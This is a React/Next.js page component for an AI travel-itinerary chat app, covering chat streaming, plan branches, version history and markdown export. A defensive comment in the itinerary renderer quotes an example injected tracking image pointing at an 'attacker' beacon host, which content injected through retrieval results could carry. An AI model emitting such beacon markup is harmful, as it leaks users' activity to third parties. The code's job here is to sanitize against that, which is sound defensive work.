"use client";

import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useParams } from "next/navigation";
import Link from "next/link";
import {
  Download,
  AlertTriangle,
  BookOpen,
  GitBranch,
  Loader2,
  Pencil,
  Map,
  MessageCircle,
  Route,
  Send,
  Sparkles,
  Undo2,
  Wallet,
} from "lucide-react";
import ReactMarkdown from "react-markdown";
import { ItineraryPanel } from "@/components/itinerary-panel";
import { LinkedReplanPreview } from "@/components/linked-replan-preview";
import { RenameForm } from "@/components/rename-form";
import { PlanChangeNotice } from "@/components/plan-change-notice";

import {
  ActionFeedback,
  Badge,
  Button,
  Card,
  ErrorBanner,
  Spinner,
} from "@/components/ui";
import { api, ApiError, chatStream } from "@/lib/api";
import {
  readChatDraft,
  saveChatDraft,
  type ChatAttempt,
} from "@/lib/chat-draft";
import type {
  BranchInfo,
  ChatClarification,
  DetailLevel,
  SessionDetail,
  VersionDetail,
  VersionInfo,
} from "@/lib/types";
import { DETAIL_LEVEL_LABELS } from "@/lib/types";
import { cn, relativeTime, scrollToElement, scrollToLatest } from "@/lib/utils";

interface Message {
  role: "user" | "assistant";
  content: string;
}

export default function ChatPage() {
  const params = useParams<{ sessionId: string }>();
  const sessionId = params.sessionId;

  const [detail, setDetail] = useState<SessionDetail | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [activeBranchId, setActiveBranchId] = useState<string | null>(null);
  const [messages, setMessages] = useState<Message[]>([]);
  const [historyRead, setHistoryRead] = useState<{
    branch: string | null;
    loading: boolean;
    error: string | null;
  }>({ branch: null, loading: true, error: null });
  const [historyRefresh, setHistoryRefresh] = useState(0);
  const historyOwner = useRef<string | null>(null);
  const messageRevision = useRef(0);
  const visibleMessages = historyRead.branch === activeBranchId ? messages : [];
  const historyLoading =
    historyRead.branch !== activeBranchId || historyRead.loading;
  const [storedVersionDetail, setVersionDetail] =
    useState<VersionDetail | null>(null);
  const versionDetail =
    storedVersionDetail?.version.branch_id === activeBranchId
      ? storedVersionDetail
      : null;
  const [input, setInput] = useState("");
  const [draftBranch, setDraftBranch] = useState<string | null>(null);
  const [failedRequest, setFailedRequest] = useState<ChatAttempt | null>(null);
  const [retainedRequest, setRetainedRequest] = useState<ChatAttempt | null>(
    null,
  );
  const [sendFailure, setSendFailure] = useState<{
    message: string;
    code: string;
  } | null>(null);
  const [clarification, setClarification] = useState<ChatClarification | null>(
    null,
  );
  // 会话标题行内编辑
  const [editingTitle, setEditingTitle] = useState(false);
  const [titleNotice, setTitleNotice] = useState("");
  const renameTrigger = useRef<HTMLButtonElement>(null);
  // 流式：当前阶段提示 / 正在逐字生成的路书 / 过程中的提示
  const [progress, setProgress] = useState<string | null>(null);
  const [streamingPlan, setStreamingPlan] = useState("");
  const [notices, setNotices] = useState<string[]>([]);
  const [level, setLevel] = useState<DetailLevel>("L2_standard");
  const [sending, setSending] = useState(false);
  const [itineraryBusy, setItineraryBusy] = useState(false);
  const textareaRef = useRef<HTMLTextAreaElement>(null);
  const messageViewport = useRef<HTMLDivElement>(null);
  const bookRef = useRef<HTMLDetailsElement>(null);
  const [mobileSection, setMobileSection] = useState<
    "route" | "map" | "budget" | "chat" | null
  >(null);

  /** 输入框随内容自动增高（上限约 6 行，超出后内部滚动）。 */
  const autoGrow = useCallback(() => {
    const el = textareaRef.current;
    if (!el) return;
    el.style.height = "auto";
    el.style.height = `${Math.min(el.scrollHeight, 160)}px`;
  }, []);

  const activeBranch = useMemo(
    () => detail?.branches.find((b) => b.id === activeBranchId) ?? null,
    [detail, activeBranchId],
  );
  const versions: VersionInfo[] = useMemo(
    () => (activeBranchId ? (detail?.versions[activeBranchId] ?? []) : []),
    [detail, activeBranchId],
  );

  const load = useCallback(async () => {
    setError(null);
    try {
      const data = await api.getSession(sessionId);
      setDetail(data);
      const primary =
        data.branches.find((b) => b.is_primary) ?? data.branches[0];
      const requested = new URLSearchParams(window.location.search).get(
        "branch",
      );
      const target = data.branches.find((branch) => branch.id === requested);
      setActiveBranchId((prev) => prev ?? target?.id ?? primary?.id ?? null);
    } catch (err) {
      setError(err instanceof Error ? err.message : "加载会话失败");
    }
  }, [sessionId]);

  /** 提交会话改名；空标题视为取消。 */
  async function commitTitle(rawTitle: string) {
    const title = rawTitle.trim();
    if (title === detail?.session.title) {
      setTitleNotice("名称未更改。");
      return;
    }
    const result = await api.updateSession(sessionId, { title });
    setDetail((old) => (old ? { ...old, session: result.session } : old));
    setTitleNotice("旅行名称已保存。");
  }

  useEffect(() => {
    void load();
  }, [load]);

  useEffect(() => {
    if (!activeBranchId) return;
    const draft = readChatDraft(activeBranchId);
    setInput(draft.input);
    setFailedRequest(draft.attempt);
    setRetainedRequest(draft.retainedAttempt);
    setSendFailure(
      draft.attempt
        ? {
            message:
              "上次发送未确认完成，可以重试这条消息，系统会核对已保存结果。",
            code: "UNCONFIRMED",
          }
        : null,
    );
    setDraftBranch(activeBranchId);
  }, [activeBranchId]);

  useEffect(() => {
    autoGrow();
  }, [input, autoGrow]);

  // 切换分支时：载入该分支的对话历史与最新版本路书
  //
  // 注意「对话历史」这一步曾经缺失 —— 后端一直有存（LangGraph checkpoint），
  // 但前端没读回来，于是用户刷新页面就看到一个空对话，像是数据丢了。
  useEffect(() => {
    if (!activeBranchId) return;
    let cancelled = false;
    const revision = messageRevision.current;
    if (historyOwner.current !== activeBranchId) {
      historyOwner.current = activeBranchId;
      setMessages([]);
      setVersionDetail(null);
      setClarification(null);
    }
    setHistoryRead({ branch: activeBranchId, loading: true, error: null });

    void api
      .getMessages(activeBranchId)
      .then((result) => {
        if (cancelled || revision !== messageRevision.current) return;
        setHistoryRead({ branch: activeBranchId, loading: false, error: null });
        setClarification(result.clarification ?? null);
        setMessages(
          result.messages.map((m) => ({
            role: m.role === "user" ? "user" : "assistant",
            content: m.content,
          })),
        );
      })
      .catch((err) => {
        if (!cancelled && revision === messageRevision.current)
          setHistoryRead({
            branch: activeBranchId,
            loading: false,
            error:
              err instanceof Error ? err.message : "对话历史读取失败，请重试。",
          });
      });

    return () => {
      cancelled = true;
    };
  }, [detail, activeBranchId, historyRefresh]);

  useEffect(() => {
    if (!activeBranchId) return;
    let cancelled = false;
    const list = detail?.versions[activeBranchId] ?? [];
    const latest = list[list.length - 1];
    if (latest) {
      void api
        .getVersion(latest.id)
        .then((data) => {
          if (!cancelled) setVersionDetail(data);
        })
        .catch(() => {
          if (!cancelled) setVersionDetail(null);
        });
    }

    return () => {
      cancelled = true;
    };
  }, [detail, activeBranchId]);

  useEffect(() => {
    scrollToLatest(messageViewport.current);
  }, [messages, sending]);

  function openSection(section: "route" | "map" | "budget" | "chat") {
    setMobileSection(section);
    const id = section === "chat" ? "journey-chat" : `journey-${section}`;
    const target = document.getElementById(id);
    scrollToElement(target, { block: "start" });
    if (section === "chat") textareaRef.current?.focus({ preventScroll: true });
    else target?.focus({ preventScroll: true });
  }

  function askFromRoute(message: string) {
    if (window.matchMedia("(max-width: 900px)").matches) openSection("chat");
    void send(message);
  }

  async function send(override?: string, retry?: ChatAttempt) {
    const text = (override ?? input).trim();
    if (
      !text ||
      !activeBranchId ||
      draftBranch !== activeBranchId ||
      sending ||
      itineraryBusy
    )
      return;
    const attempt = retry ??
      [failedRequest, retainedRequest].find(
        (request) => request?.message === text,
      ) ?? {
        message: text,
        request_id: crypto.randomUUID(),
        detail_level: level,
      };
    const clearInput =
      override === undefined || (retry && input.trim() === retry.message);
    const remainingInput = clearInput ? "" : input;
    // 快捷建议和候选选择可以独立发送；输入框里的失败消息仍需沿用原请求号。
    const remainingAttempt =
      [failedRequest, retainedRequest].find(
        (request) =>
          request &&
          request.request_id !== attempt.request_id &&
          request.message === remainingInput.trim(),
      ) ?? null;
    messageRevision.current++;
    setHistoryRead({ branch: activeBranchId, loading: false, error: null });
    if (!retry)
      setMessages((prev) => [
        ...(historyRead.branch === activeBranchId ? prev : []),
        { role: "user", content: text },
      ]);
    setInput(remainingInput);
    setSendFailure(null);
    setFailedRequest(null);
    setRetainedRequest(remainingAttempt);
    saveChatDraft(activeBranchId, remainingInput, attempt, remainingAttempt);

    // 发送后把输入框收回一行高度
    if (clearInput)
      requestAnimationFrame(() => {
        if (textareaRef.current) textareaRef.current.style.height = "auto";
      });
    setSending(true);
    setProgress(null);
    setStreamingPlan("");
    setNotices([]);

    let reply = "";
    let finalPlan = "";
    try {
      // 流式：进度与增量文本实时显示，避免 30~40 秒一直干等
      await chatStream(
        {
          ...attempt,
          session_id: sessionId,
          branch_id: activeBranchId,
        },
        {
          onProgress: (message) => setProgress(message),
          onNotice: (message) => setNotices((prev) => [...prev, message]),
          onToken: (piece) => {
            // 开始出文本时就撤掉「正在撰写」的提示，改看正文
            setProgress(null);
            finalPlan += piece;
            setStreamingPlan(finalPlan);
          },
          onDone: (result) => {
            setClarification(result.clarification ?? null);
            reply = result.reply;
            finalPlan = result.plan || finalPlan;
          },
        },
      );

      setMessages((prev) => [
        ...prev,
        { role: "assistant", content: reply || "（无回复内容）" },
      ]);
      setFailedRequest(remainingAttempt);
      setRetainedRequest(null);
      setSendFailure(
        remainingAttempt
          ? {
              message: "原消息仍未确认完成，可以重试，系统会核对已保存结果。",
              code: "UNCONFIRMED",
            }
          : null,
      );
      saveChatDraft(activeBranchId, remainingInput, remainingAttempt);
      await load();
    } catch (err) {
      const restored = clearInput ? text : input;
      setInput(restored);
      setFailedRequest(attempt);
      setSendFailure({
        message: err instanceof Error ? err.message : "发送失败，输入已保留。",
        code: err instanceof ApiError ? err.code : "UNKNOWN",
      });
      saveChatDraft(activeBranchId, restored, attempt, remainingAttempt);
      await load();
    } finally {
      setSending(false);
      setProgress(null);
      // 稍后清空流式正文：等 load() 把正式版本渲染出来再撤，避免闪一下空白
      setTimeout(() => setStreamingPlan(""), 300);
    }
  }

  async function forkFromVersion(version: VersionInfo) {
    const title = window.prompt("新分支的名称", `分支 ${version.seq}`);
    if (!title) return;
    try {
      await api.createBranch(sessionId, {
        title,
        parent_branch_id: version.branch_id,
        fork_version_id: version.id,
      });
      await load();
    } catch (err) {
      setError(err instanceof Error ? err.message : "创建分支失败");
    }
  }

  if (error && !detail) {
    return (
      <div className="mx-auto max-w-2xl px-5 py-10">
        <ErrorBanner message={error} onRetry={load} />
      </div>
    );
  }

  if (!detail) {
    return (
      <div className="mx-auto max-w-2xl px-5 py-10">
        <Spinner label="正在加载会话…" />
      </div>
    );
  }

  return (
    <div
      className="journey-workspace"
      data-has-itinerary={!!versionDetail?.itinerary?.days.length}
    >
      {/* 顶部：会话标题 + 分支切换 */}
      <div className="journey-workspace-heading">
        <div>
          {editingTitle ? (
            <RenameForm
              title={detail.session.title}
              onSave={commitTitle}
              onClose={() => {
                setEditingTitle(false);
                requestAnimationFrame(() => renameTrigger.current?.focus());
              }}
            />
          ) : (
            <h1 className="journey-title flex items-center gap-2">
              {detail.session.title}
              <button
                ref={renameTrigger}
                className="journey-rename"
                title="重命名这个旅行"
                aria-label="重命名这个旅行"
                onClick={() => {
                  setTitleNotice("");
                  setEditingTitle(true);
                }}
              >
                <Pencil className="h-3.5 w-3.5" />
              </button>
            </h1>
          )}
          {titleNotice && (
            <p role="status" className="mt-2 text-sm text-accent">
              {titleNotice}
            </p>
          )}
          <p className="text-xs text-muted">
            {detail.branches.length} 个分支 · 已保留版本历史
          </p>
        </div>
        <div className="journey-branch-controls">
          {detail.branches.map((branch: BranchInfo) => (
            <button
              key={branch.id}
              disabled={sending || itineraryBusy}
              onClick={() => setActiveBranchId(branch.id)}
              aria-pressed={branch.id === activeBranchId}
              className="journey-branch-choice"
            >
              {branch.title}
              {branch.is_primary && branch.title !== "主方案" && (
                <span className="journey-primary-label">主方案</span>
              )}
            </button>
          ))}
          <Link href="/compare" className="tf-button" data-size="sm">
            <GitBranch aria-hidden="true" className="h-3.5 w-3.5" />
            对比分支
          </Link>
          <Button
            size="sm"
            onClick={() => {
              if (bookRef.current) {
                bookRef.current.open = true;
                scrollToElement(bookRef.current, { block: "start" });
              }
            }}
          >
            <BookOpen aria-hidden="true" className="h-3.5 w-3.5" />
            完整路书
          </Button>
          {activeBranchId && (
            <Link
              href={`/workflow/${sessionId}?branch=${activeBranchId}${versionDetail && versions.at(-1)?.id !== versionDetail.version.id ? `&version=${versionDetail.version.id}` : ""}`}
              className="tf-button"
              data-size="sm"
            >
              高级流程
            </Link>
          )}
        </div>
      </div>

      <div className="journey-workspace-grid">
        <section
          id="journey-chat"
          tabIndex={-1}
          aria-label="旅行对话"
          className="journey-chat-column"
        >
          {/* ---------------- 对话 ---------------- */}
          <Card className="journey-chat-shell">
            <div className="journey-chat-heading">
              <h2>继续聊这趟旅行</h2>
              {activeBranch && (
                <Badge tone={activeBranch.is_primary ? "brand" : "teal"}>
                  {activeBranch.title}
                </Badge>
              )}
            </div>

            {(historyLoading || historyRead.error) && (
              <div
                className="journey-history-feedback"
                role="region"
                aria-label="对话历史状态"
              >
                <ActionFeedback
                  pending={
                    historyLoading ? "正在读取这份方案的对话…" : undefined
                  }
                  error={
                    historyRead.error
                      ? `对话暂时未读出：${historyRead.error}`
                      : null
                  }
                  onRetry={() => {
                    if (historyLoading) return;
                    setHistoryRead({
                      branch: activeBranchId,
                      loading: true,
                      error: null,
                    });
                    setHistoryRefresh((value) => value + 1);
                  }}
                />
                {historyRead.error && (
                  <p className="mt-2 text-xs text-muted">
                    已显示的内容和输入会保留；可重试读取，也可继续对话。
                  </p>
                )}
              </div>
            )}

            <div
              ref={messageViewport}
              aria-label="对话消息"
              className="journey-messages"
            >
              {!!detail?.session.initial_preferences?.length && (
                <details
                  aria-label="创建时选用的偏好"
                  className="rounded-lg bg-accent-soft px-3 py-2 text-xs leading-6 text-accent"
                >
                  <summary className="cursor-pointer">
                    创建时选用{detail.session.initial_preferences.length}
                    项常用偏好
                  </summary>
                  <p className="mt-2 break-words">
                    {detail.session.initial_preferences.join(" · ")}
                  </p>
                  <p>
                    仅为初始参考，后续以本次对话为准。可说「这次清空偏好」或提出新偏好。
                  </p>
                </details>
              )}
              {visibleMessages.length === 0 &&
                !historyLoading &&
                !historyRead.error && (
                  <div className="rounded-lg bg-surface px-4 py-3 text-xs leading-relaxed text-muted">
                    {versionDetail ? (
                      <>
                        这份行程已经保存。想换个地方、少走一点，或调整费用，继续告诉我就好。
                        {!versionDetail.itinerary?.days.length &&
                          "也可以先将旧路书整理成每日路线。"}
                      </>
                    ) : (
                      <>
                        告诉我你的旅行想法即可，例如：
                        <br />
                        「我想去重庆玩 3 天，从北京出发，预算 2000」
                        <br />
                        还没想好去哪，也可以让我先推荐城市。
                      </>
                    )}
                  </div>
                )}

              {visibleMessages.map((message, index) => (
                <div
                  key={index}
                  className={cn(
                    "flex gap-2.5",
                    message.role === "user" && "flex-row-reverse",
                  )}
                >
                  <div
                    className="journey-avatar"
                    data-author={message.role}
                    aria-hidden="true"
                  >
                    {message.role === "user" ? "我" : "AI"}
                  </div>
                  <div className="journey-message" data-author={message.role}>
                    {message.content}
                  </div>
                </div>
              ))}

              {versions.at(-1) && activeBranchId && (
                <PlanChangeNotice
                  key={activeBranchId}
                  branchId={activeBranchId}
                  versionId={versions.at(-1)!.id}
                  visible={versionDetail?.version.id === versions.at(-1)?.id}
                  disabled={sending || itineraryBusy}
                  onBusy={setItineraryBusy}
                  onRefresh={load}
                />
              )}

              {notices.map((notice) => (
                <div
                  key={notice}
                  className="rounded-lg bg-warning-soft px-3 py-2 text-xs text-warning"
                >
                  <AlertTriangle
                    aria-hidden="true"
                    className="mr-1 inline h-3.5 w-3.5"
                  />
                  {notice}
                </div>
              ))}

              {sending && (
                <div className="flex items-center gap-2 text-xs text-accent">
                  <Loader2 className="h-3.5 w-3.5 animate-spin" />
                  {progress ?? "正在处理…"}
                </div>
              )}
            </div>

            <div className="journey-composer">
              {sendFailure && (
                <div
                  role="alert"
                  aria-label="消息发送未完成"
                  className="mb-3 rounded-lg border border-danger-line bg-danger-soft p-3 text-xs leading-6 text-danger"
                >
                  <p>{sendFailure.message}</p>
                  <div className="mt-1 flex flex-wrap gap-3">
                    {failedRequest && (
                      <button
                        type="button"
                        disabled={sending || itineraryBusy}
                        className="underline disabled:opacity-40"
                        onClick={() =>
                          void send(failedRequest.message, failedRequest)
                        }
                      >
                        重试这条消息
                      </button>
                    )}
                    {/LLM_AUTH|CONFIG_INVALID/.test(sendFailure.code) && (
                      <Link href="/settings" className="underline">
                        检查模型设置
                      </Link>
                    )}
                  </div>
                </div>
              )}
              {clarification && (
                <div
                  role="status"
                  aria-label="待补充的信息"
                  className="mb-3 rounded-lg border border-warning-line bg-warning-soft p-3 text-xs leading-6 text-warning"
                >
                  <p className="whitespace-pre-wrap break-words">
                    {clarification.prompt}
                  </p>
                  {clarification.kind === "linked_replan" && (
                    <LinkedReplanPreview preview={clarification} />
                  )}
                  {clarification.options &&
                    clarification.options.length > 0 && (
                      <div
                        role="group"
                        aria-label={
                          clarification.kind === "expense"
                            ? "消费记录选择"
                            : clarification.kind === "move_activity"
                              ? "搬移景点选择"
                              : clarification.kind === "linked_replan"
                                ? "两天调整操作"
                                : "地点候选选择"
                        }
                        className="my-2 grid max-h-64 min-w-0 gap-2 overflow-y-auto"
                      >
                        {clarification.options.map((option) => (
                          <button
                            key={option.reply}
                            type="button"
                            disabled={sending || itineraryBusy}
                            className="rounded-lg border border-warning-line bg-surface px-3 py-2 text-left leading-5 break-words hover:border-warning-line disabled:opacity-40"
                            onClick={() => void send(option.reply)}
                          >
                            {option.label}
                          </button>
                        ))}
                      </div>
                    )}
                  <button
                    type="button"
                    disabled={sending || itineraryBusy}
                    className="mt-1 text-warning underline disabled:opacity-40"
                    onClick={() => void send("取消这次操作")}
                  >
                    取消这次操作
                  </button>
                </div>
              )}
              <div className="flex items-end gap-2">
                <textarea
                  ref={textareaRef}
                  rows={1}
                  className="journey-chat-input"
                  placeholder="说出你的想法，或回复「确认」定稿…"
                  aria-label="旅行对话输入"
                  value={input}
                  onChange={(e) => {
                    setInput(e.target.value);
                    if (activeBranchId)
                      saveChatDraft(
                        activeBranchId,
                        e.target.value,
                        failedRequest,
                        retainedRequest,
                      );
                    autoGrow();
                  }}
                  onKeyDown={(e) => {
                    // Enter 发送、Shift+Enter 换行；输入法组合中（如中文候选）不触发发送
                    if (
                      e.key === "Enter" &&
                      !e.shiftKey &&
                      !e.nativeEvent.isComposing
                    ) {
                      e.preventDefault();
                      void send();
                    }
                  }}
                  disabled={
                    sending || itineraryBusy || draftBranch !== activeBranchId
                  }
                />
                <Button
                  variant="primary"
                  loading={sending}
                  disabled={itineraryBusy || draftBranch !== activeBranchId}
                  onClick={() => void send()}
                >
                  <Send className="h-3.5 w-3.5" />
                  发送
                </Button>
              </div>
              <div className="mt-1.5 flex justify-between px-1 text-[11px] text-muted">
                <span>Enter 发送 · Shift+Enter 换行</span>
                <span
                  className={input.length > 4000 ? "text-danger" : undefined}
                >
                  {input.length} / 4000
                </span>
              </div>
            </div>
          </Card>
        </section>
        <div className="journey-route-column">
          {versionDetail?.itinerary?.days.length ? (
            <nav className="journey-desktop-tools" aria-label="行程工具">
              <Button
                size="sm"
                variant="ghost"
                onClick={() => openSection("route")}
              >
                今日路线
              </Button>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => openSection("map")}
              >
                地图
              </Button>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => openSection("budget")}
              >
                费用
              </Button>
            </nav>
          ) : null}
          {versionDetail ? (
            <ItineraryPanel
              key={versionDetail.version.branch_id}
              detail={versionDetail}
              editable={
                versions[versions.length - 1]?.id === versionDetail.version.id
              }
              disabled={sending || itineraryBusy}
              onBusy={setItineraryBusy}
              onUpdate={async (updated) => {
                await load();
                setVersionDetail(updated);
              }}
              onFork={() => forkFromVersion(versionDetail.version)}
              onAsk={askFromRoute}
            />
          ) : (
            <Card className="journey-planning-help">
              <div className="flex h-full flex-col justify-center">
                <p className="text-xs font-medium tracking-widest text-accent">
                  从一句想法开始
                </p>
                <h2>先聊旅行想法</h2>
                <p className="mt-4 max-w-md text-sm leading-7 text-muted">
                  可以告诉我目的地、时间和偏好；还没想好去哪，也可以让我先推荐几个城市。
                </p>
                <p className="mt-4 text-xs text-muted">
                  例如：从上海出发，周末两天，想少走路。
                </p>
              </div>
            </Card>
          )}{" "}
        </div>
      </div>

      <details ref={bookRef} className="journey-book">
        <summary className="cursor-pointer text-sm font-medium text-muted">
          完整计划书、导出与版本历史
        </summary>
        <div className="mt-4 grid gap-4 lg:grid-cols-[220px_minmax(0,1fr)]">
          {/* ---------------- 版本树 ---------------- */}
          <Card className="overflow-hidden">
            <div className="border-b border-line bg-surface px-3.5 py-2.5 text-xs font-bold text-muted">
              版本历史（{versions.length}）
            </div>
            <div className="max-h-[540px] overflow-y-auto p-3">
              {versions.length === 0 ? (
                <p className="px-1 py-3 text-xs text-muted">
                  还没有版本，先发一条消息吧
                </p>
              ) : (
                <ol className="relative ml-1.5 border-l border-line">
                  {[...versions].reverse().map((version) => (
                    <li key={version.id} className="relative mb-3 pl-4">
                      <span
                        className={cn(
                          "absolute -left-[5px] top-1.5 h-2.5 w-2.5 rounded-full border-2 border-line",
                          version.id === versionDetail?.version.id
                            ? "bg-accent"
                            : "bg-line",
                        )}
                      />
                      <button
                        className="block w-full rounded-lg px-2 py-1 text-left transition hover:bg-surface"
                        disabled={sending || itineraryBusy}
                        onClick={() =>
                          void api.getVersion(version.id).then(setVersionDetail)
                        }
                      >
                        <span className="text-[11px] font-bold text-accent">
                          v{version.seq}
                        </span>
                        <span className="mt-0.5 block text-xs text-muted">
                          {version.summary}
                        </span>
                        <span className="text-[10px] text-muted">
                          {relativeTime(version.created_at)}
                        </span>
                      </button>
                      <button
                        className="mt-1 ml-2 flex items-center gap-1 text-[10px] text-muted hover:text-accent"
                        disabled={sending || itineraryBusy}
                        onClick={() => forkFromVersion(version)}
                        title="从该版本新建分支"
                      >
                        <Undo2 className="h-3 w-3" />
                        从这里分叉
                      </button>
                    </li>
                  ))}
                </ol>
              )}
            </div>
          </Card>
          {/* ---------------- 路书 ---------------- */}
          <Card className="flex flex-col overflow-hidden">
            <div className="flex items-center justify-between border-b border-line bg-surface px-3.5 py-2.5">
              <span className="text-xs font-bold text-muted">
                路书预览
                {versionDetail && (
                  <span className="ml-2 font-normal text-muted">
                    v{versionDetail.version.seq} ·{" "}
                    {versionDetail.markdown.length} 字
                  </span>
                )}
              </span>
              <select
                className="rounded-lg border border-line bg-surface px-2 py-1 text-[11px]"
                value={level}
                onChange={(e) => setLevel(e.target.value as DetailLevel)}
              >
                {(Object.keys(DETAIL_LEVEL_LABELS) as DetailLevel[]).map(
                  (key) => (
                    <option key={key} value={key}>
                      {DETAIL_LEVEL_LABELS[key]}档
                    </option>
                  ),
                )}
              </select>
            </div>

            <div className="max-h-[460px] min-h-[300px] flex-1 overflow-y-auto p-4">
              {streamingPlan ? (
                // 流式生成中：先把已到达的正文显示出来，让用户看到「正在写」
                <div className="prose-report">
                  <ReactMarkdown>{streamingPlan}</ReactMarkdown>
                  <span className="ml-0.5 inline-block h-4 w-1.5 animate-pulse bg-accent align-text-bottom" />
                </div>
              ) : versionDetail?.markdown ? (
                <div className="prose-report">
                  <ReactMarkdown
                    // 安全：路书内容来自模型 + 外部检索结果，可能被注入
                    // `![](http://attacker/beacon?d=...)` 这类埋点图片。
                    // 这里①只放行 http(s) 协议；②图片不发送 Referer，
                    // 避免把「谁在何时打开了这份路书」泄漏给第三方。
                    urlTransform={(url) =>
                      /^https?:\/\//i.test(url) ? url : ""
                    }
                    components={{
                      img: ({ node, ...props }) => (
                        // eslint-disable-next-line @next/next/no-img-element
                        <img
                          {...props}
                          referrerPolicy="no-referrer"
                          loading="lazy"
                          alt=""
                        />
                      ),
                      a: ({ node, ...props }) => (
                        <a
                          {...props}
                          target="_blank"
                          rel="noopener noreferrer nofollow"
                        />
                      ),
                    }}
                  >
                    {versionDetail.markdown}
                  </ReactMarkdown>
                </div>
              ) : (
                <div className="flex h-full flex-col items-center justify-center gap-2 text-center text-xs text-muted">
                  <Sparkles className="h-7 w-7 text-muted" />
                  路书生成后显示在这里
                </div>
              )}
            </div>

            <div className="flex flex-wrap items-center gap-2 border-t border-line bg-surface p-3">
              {versionDetail ? (
                <>
                  <a
                    className="tf-button"
                    data-size="sm"
                    href={api.exportUrl(versionDetail.version.id, "md")}
                  >
                    <Download aria-hidden="true" className="h-3.5 w-3.5" />
                    导出 Markdown
                  </a>
                  <a
                    className="tf-button"
                    data-size="sm"
                    href={api.exportUrl(versionDetail.version.id, "html")}
                  >
                    <Download aria-hidden="true" className="h-3.5 w-3.5" />
                    导出 HTML
                  </a>
                  {versionDetail.citations.length > 0 && (
                    <span className="text-[11px] text-muted">
                      {versionDetail.citations.length} 个来源
                    </span>
                  )}
                </>
              ) : (
                <span className="text-[11px] text-muted">暂无内容可导出</span>
              )}
            </div>
          </Card>{" "}
        </div>
      </details>

      <nav className="journey-mobile-nav" aria-label="旅行快捷导航">
        {(
          [
            { id: "route", label: "今日", icon: Route },
            { id: "map", label: "地图", icon: Map },
            { id: "budget", label: "费用", icon: Wallet },
            { id: "chat", label: "对话", icon: MessageCircle },
          ] as const
        ).map((item) => {
          const Icon = item.icon;
          const available =
            item.id === "chat" ||
            (item.id === "route"
              ? !!versionDetail
              : !!versionDetail?.itinerary?.days.length);
          const current =
            mobileSection ??
            (versionDetail?.itinerary?.days.length ? "route" : "chat");
          return (
            <Button
              type="button"
              variant="ghost"
              key={item.id}
              aria-current={current === item.id ? "location" : undefined}
              disabled={!available}
              onClick={() => openSection(item.id)}
              className="tf-action-link journey-mobile-link"
            >
              <Icon aria-hidden="true" className="h-4 w-4" />
              <span>{item.label}</span>
            </Button>
          );
        })}
      </nav>
      {error && (
        <div className="mt-4">
          <ErrorBanner message={error} onRetry={load} />
        </div>
      )}
    </div>
  );
}
